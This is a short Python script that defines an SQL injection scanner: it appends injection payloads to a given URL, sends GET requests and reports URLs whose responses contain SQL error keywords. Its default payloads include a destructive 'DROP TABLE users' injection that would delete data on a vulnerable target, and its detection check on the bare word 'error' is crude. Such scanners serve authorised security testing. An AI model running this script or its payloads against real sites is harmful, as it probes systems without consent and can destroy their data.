import requests

def scan_for_sql_injection(url, payloads=None):
    if payloads is None:
        payloads = ["'", "1' OR '1'='1", "1'; DROP TABLE users; --"]

    vulnerable_urls = []

    print("[+] Starting SQL Injection Scan...")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if any(keyword in response.text for keyword in ['SQL syntax', 'mysql', 'error']):
                print(f"[+] Vulnerable to SQL Injection: {test_url}")
                vulnerable_urls.append(test_url)
        except requests.RequestException:
            print(f"[!] Error connecting to {test_url}")

    return vulnerable_urls
